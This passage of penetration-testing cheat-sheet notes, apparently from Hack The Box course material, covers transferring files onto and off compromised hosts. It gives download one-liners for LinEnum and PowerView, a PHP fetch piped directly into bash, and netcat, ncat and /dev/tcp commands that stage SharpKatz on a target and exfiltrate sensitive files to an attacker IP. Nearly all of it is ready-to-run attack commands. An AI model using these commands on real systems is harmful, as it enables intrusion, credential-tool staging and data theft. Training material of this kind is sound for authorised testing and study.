python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

### 🐘 PHP Downloads

#### Method 1: Using `file_get_contents`

Bash

```
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

#### Method 2: Using `fopen` (Buffered Read/Write)

Bash

```
php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

#### Method 3: Fileless Execution (Piped directly to Bash)

Bash

```
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

### 💎 Ruby & 🐪 Perl Downloads

#### Ruby One-Liner

Bash

```
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

#### Perl One-Liner

Bash

```
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

### 🪟 Windows Scripting Engine Downloads

#### 1. JavaScript Method

Save the following code block locally as **`wget.js`**:

JavaScript

```
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);WinHttpReq.Send();BinStream = new ActiveXObject("ADODB.Stream");BinStream.Type = 1;BinStream.Open();BinStream.Write(WinHttpReq.ResponseBody);BinStream.SaveToFile(WScript.Arguments(1));
```

Execute the script from a Windows Command Prompt or PowerShell terminal:

DOS

```
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

#### 2. VBScript Method

Save the following code block locally as **`wget.vbs`**:

VBScript

```
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send
with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

Execute the script from a Windows Command Prompt or PowerShell terminal:

DOS

```
cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

***

***

### 📥 Download Operations (Bringing Files ONTO a System)

These commands are used to pull tools or payloads from an external source onto a target system or to pull logs down to a local administrative machine.

| **Tool / Protocol**              | **Scenario / Flow**               | **Command to Execute**                                                                                                                                                                                                                                                          | **Required Service / Port Setup**                                                                                |
| -------------------------------- | --------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------- |
| **Netcat (Bind style)**          | Attacker ➡️ Target                | <p><strong>On Target (To Receive):</strong><br><br><br><br><code>nc -l -p 8000 > SharpKatz.exe</code><br><br><br><br><br><strong>On Attacker (To Send):</strong><br><br><br><br><code>nc -q 0 &#x3C;Target_IP> 8000 &#x3C; SharpKatz.exe</code></p>                             | **Target side:** Must open inbound TCP port **8000** to accept the connection.                                   |
| **Ncat (Bind style)**            | Attacker ➡️ Target                | <p><strong>On Target (To Receive):</strong><br><br><br><br><code>ncat -l -p 8000 --recv-only > SharpKatz.exe</code><br><br><br><br><br><strong>On Attacker (To Send):</strong><br><br><br><br><code>ncat --send-only &#x3C;Target_IP> 8000 &#x3C; SharpKatz.exe</code></p>      | **Target side:** Inbound TCP port **8000** open. `--recv-only` automatically shuts the session when finished.    |
| **Netcat (Reverse style)**       | Attacker ➡️ Target                | <p><strong>On Attacker (To Send):</strong><br><br><br><br><code>sudo nc -l -p 443 -q 0 &#x3C; SharpKatz.exe</code><br><br><br><br><br><strong>On Target (To Receive):</strong><br><br><br><br><code>nc &#x3C;Attacker_IP> 443 > SharpKatz.exe</code></p>                        | **Attacker side:** Listens on port **443** (bypasses restrictive target firewalls blocking inbound connections). |
| **Ncat (Reverse style)**         | Attacker ➡️ Target                | <p><strong>On Attacker (To Send):</strong><br><br><br><br><code>sudo ncat -l -p 443 --send-only &#x3C; SharpKatz.exe</code><br><br><br><br><br><strong>On Target (To Receive):</strong><br><br><br><br><code>ncat &#x3C;Attacker_IP> 443 --recv-only > SharpKatz.exe</code></p> | **Attacker side:** Listens on port **443** using Ncat's built-in stream handling termination rules.              |
| **Bash /dev/tcp**                | Attacker ➡️ Target                | <p><strong>On Attacker:</strong> <em>Use standard Netcat/Ncat listener above.</em><br><br><br><br><br><strong>On Target (To Receive):</strong><br><br><br><br><code>cat &#x3C; /dev/tcp/&#x3C;Attacker_IP>/443 > SharpKatz.exe</code></p>                                       | **Attacker side:** Must have an open listening socket on TCP port **443**. Target uses native Bash structures.   |
| **WinRM (PowerShell Session)**   | Remote Session ➡️ Local Admin Box | <p><strong>On Local Box (To Pull file down):</strong><br><br><br><br><code>Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session</code></p>                                                                                      | **Remote machine:** Must have WinRM active on TCP port **5985** (HTTP) or **5986** (HTTPS).                      |
| **RDP Drive Share (`rdesktop`)** | Attacker Share ➡️ Target          | <p><strong>On Attacker Linux Host (Mount execution):</strong><br><br><br><br><code>rdesktop &#x3C;Target_IP> -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'</code></p>                                                                       | **Target side:** Maps paths through virtual folder path **`\\tsclient\linux\`** once RDP GUI initializes.        |
| **RDP Drive Share (`xfreerdp`)** | Attacker Share ➡️ Target          | <p><strong>On Attacker Linux Host (Mount execution):</strong><br><br><br><br><code>xfreerdp /v:&#x3C;Target_IP> /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer</code></p>                                                        | **Target side:** Exposes the attacker's folder inside the target RDP instance under **`\\tsclient\linux\`**.     |

### 📤 Upload Operations (Sending Files OUT of a System)

These commands are used to exfiltrate confidential system databases, password files, or application logs back out to an administrative machine or an attacker host.

| **Tool / Protocol**            | **Scenario / Flow**               | **Command to Execute**                                                                                                                                                                                                                                                                    | **Required Service / Port Setup**                                                                                        |
| ------------------------------ | --------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------ |
| **Netcat Exfiltration**        | Target ➡️ Attacker                | <p><strong>On Attacker (To Catch data):</strong><br><br><br><br><code>nc -l -p 443 -q 0 > exfil_data.txt</code><br><br><br><br><br><strong>On Target (To Exfiltrate):</strong><br><br><br><br><code>nc &#x3C;Attacker_IP> 443 &#x3C; sensitive_file.txt</code></p>                        | **Attacker side:** Listens on inbound TCP port **443** to collect incoming data streams safely.                          |
| **Ncat Exfiltration**          | Target ➡️ Attacker                | <p><strong>On Attacker (To Catch data):</strong><br><br><br><br><code>ncat -l -p 443 --recv-only > exfil_data.txt</code><br><br><br><br><br><strong>On Target (To Exfiltrate):</strong><br><br><br><br><code>ncat --send-only &#x3C;Attacker_IP> 443 &#x3C; sensitive_file.txt</code></p> | **Attacker side:** Listens on inbound TCP port **443**. Handles programmatic connection termination via flags.           |
| **Bash /dev/tcp Exfil**        | Target ➡️ Attacker                | <p><strong>On Attacker:</strong> <em>Use standard Netcat/Ncat catch listener above.</em><br><br><br><br><br><strong>On Target (To Exfiltrate):</strong><br><br><br><br><code>cat sensitive_file.txt > /dev/tcp/&#x3C;Attacker_IP>/443</code></p>                                          | **Attacker side:** Open listening port **443**. Target dumps file contents over a raw outbound TCP connection block.     |
| **WinRM (PowerShell Session)** | Local Admin Box ➡️ Remote Session | <p><strong>On Local Box (To Push file up):</strong><br><br><br><br><code>Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop&#x3C;/code></code></p>                                                                                         | **Remote machine:** Requires a pre-established `$Session` handle via `New-PSSession` over port **5985/5986**.            |
| **RDP Drive Transfer**         | Target ➡️ Attacker Share          | <p><strong>On Target Windows OS GUI:</strong><br><br><br><br>Open File Explorer ➡️ Navigate to <strong><code>\tsclient\linux&#x3C;/code></code></strong><code> ➡️ Drag and drop local target files into the network directory.</code></p>                                                 | Requires starting the initial RDP connection string with disk redirection parameters configured (`/drive` or `-r disk`). |

***

***
